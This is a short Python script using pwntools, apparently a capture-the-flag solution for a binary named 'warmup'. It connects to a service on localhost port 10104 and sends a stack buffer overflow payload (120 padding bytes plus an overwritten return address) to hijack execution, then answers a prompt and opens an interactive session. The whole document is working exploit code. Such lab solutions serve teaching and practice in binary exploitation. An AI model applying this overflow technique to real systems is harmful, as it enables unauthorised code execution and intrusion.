from pwn import *

context.log_level = 'debug'

# p = process("./warmup")
p = remote('localhost',10104)

payload = 'a'*120+p64(0x401182)

p.send(payload)
p.sendlineafter("[Y/N]", "Y")
p.interactive()